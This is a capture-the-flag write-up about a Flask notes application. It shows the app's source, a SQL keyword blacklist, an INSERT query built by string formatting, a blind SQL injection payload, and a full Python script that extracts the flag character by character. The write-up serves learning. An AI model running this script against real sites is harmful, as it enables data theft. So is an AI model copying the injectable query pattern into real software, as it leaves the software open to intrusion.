@@ -1,0 +1,193 @@
+
+After starting the CTF instance, we are greeted with a simple registration page. At first glance, this seems like a basic “notes” website where users can register, log in, and input their personal notes. However, as CTF participants, we know things are never that simple, and there’s likely a hidden vulnerability for us to exploit.
+
+The goal of this challenge is to retrieve the flag. To achieve this, we must analyze the provided source code and attempt to exploit any security loopholes.
+
+```python
+from flask import Flask, render_template, request, redirect, url_for, session
+import sqlite3
+from sqlite3 import Error
+import string
+import random
+import re
+
+class Database:
+    def __init__(self, db):
+        self.db = db
+        try:
+            self.conn = sqlite3.connect(self.db, check_same_thread=False)
+        except:
+            self.conn = None
+
+    def gen_random(self) -> str:
+        letters = string.ascii_lowercase
+        result_str = ''.join(random.choice(letters) for i in range(15))
+        return result_str
+
+    def execute_statement(self, create_table_sql) -> str:
+        try:
+            c = self.conn.cursor()
+            return c.execute(create_table_sql)
+        except Error as e:
+            return e
+
+    def create_tables(self) -> str:
+        create_user_table = '''
+            CREATE TABLE IF NOT EXISTS user(
+                id integer PRIMARY KEY,
+                username text NOT NULL,
+                password text NOT NULL
+            );
+        '''
+        create_user_note = '''
+            CREATE TABLE IF NOT EXISTS notes(
+                username text NOT NULL,
+                notes text NOT NULL
+            );
+        '''
+        create_flag_table = '''
+            CREATE TABLE IF NOT EXISTS flag(
+                flag text NOT NULL
+            );
+        '''
+        if self.conn is not None:
+            self.execute_statement(create_user_table)
+            self.execute_statement(create_flag_table)
+            self.execute_statement(create_user_note)
+            return "Tables have been created"
+        else:
+            return "Something went wrong"
+
+    def insert(self, statement, *args) -> bool:
+        try:
+            sql = statement
+            curs = self.conn.cursor()
+            curs.execute(sql, (args))
+            self.conn.commit()
+            return True
+        except:
+            return False   
+
+    def select(self, statement, *args) -> list:
+        curs = self.conn.cursor()
+        curs.execute(statement, (args))
+        rows = curs.fetchall()
+        result = []
+        for row in rows:
+            result.append(row)
+        return result
+```
+
+The application uses an SQLite database for storing users, notes, and the hidden flag. The relevant tables are:
+
+- `user`: Stores the usernames and passwords of registered users.
+- `notes`: Stores notes submitted by logged-in users.
+- `flag`: Stores the flag we're trying to extract.
+
+The application employs a blacklist of certain SQL keywords (e.g., `exec`, `union`, `join`) to prevent common SQL injection attacks:
+
+```python
+def blacklist(string):
+    string = string.lower()
+    blocked_words = ['exec', 'load', 'blob', 'glob', 'union', 'join', 'like', 'match', 'regexp', 'in', 'limit', 'order', 'hex', 'where']
+    for word in blocked_words:
+        if word in string:
+            return True
+    return False
+```
+
+### SQL Injection in Notes
+
+```python
+query = db.insert("INSERT INTO notes(username, notes) VALUES(?,'%s')" % note, session['username'])
+```
+
+### Exploiting the SQL Injection Vulnerability
+
+Testing the application locally, I modified the code to print out the SQL queries being executed:
+
+```python
+def insert(self, statement, *args) -> bool:
+    try:
+        sql = statement
+        print(f"Executing SQL Query: {sql}")
+        curs = self.conn.cursor()
+        curs.execute(sql, (args))
+        self.conn.commit()
+        return True
+    except Exception as e:
+        print(f"Error executing query: {e}")
+        return False
+```
+
+### Blind SQL Injection for Flag Extraction
+
+To extract the flag, I used blind SQL injection:
+
+```sql
+' OR SUBSTR((SELECT flag FROM flag), 1, 1) = 'F'
+```
+
+### Python Script to Automate Flag Extraction
+
+```python
+import requests
+import string
+
+base_url = "http://your-instance-url.com/"
+register_url = base_url + "register"
+login_url = base_url + "login"
+add_note_url = base_url
+
+charset = string.digits + string.ascii_letters + "{}_"
+flag = ""
+position = 1
+
+username = "your_username"  
+password = "your_password" 
+
+session = requests.Session()
+
+def login():
+    login_data = {"username": username, "password": password}
+    response = session.post(login_url, data=login_data)
+    if "Welcome" in response.text:
+        print("[+] Login successful!")
+    else:
+        print("[-] Login failed.")
+        exit()
+
+def test_char_for_position(char, position):
+    payload = f"' OR SUBSTR((SELECT flag FROM flag), {position}, 1) = '{char}"
+    data = {"note": payload}
+    response = session.post(add_note_url, data=data)
+
+    reflected_values = [val for val in response.text if val in ('0', '1')]
+
+    if reflected_values and reflected_values[-1] == '1':
+        print(f"[+] Correct character at position {position}: '{char}'")
+        return True
+    return False
+
+login()
+
+while True:
+    found_char = False
+    for char in charset:
+        if test_char_for_position(char, position):
+            flag += char
+            print(f"[+] Flag so far: {flag}")
+            position += 1
+            found_char = True
+            break
+    
+    if not found_char:
+        print("[*] Flag extraction complete!")
+        break
+
+print(f"[+] Extracted flag: {flag}")
+```
+
+The script maintains a session throughout to avoid logging in for every request, dynamically generates SQL injection payloads for each character and position, and extracts characters one by one until the entire flag is retrieved.
+
+Flag extracted: `FlagY{**********************************}`
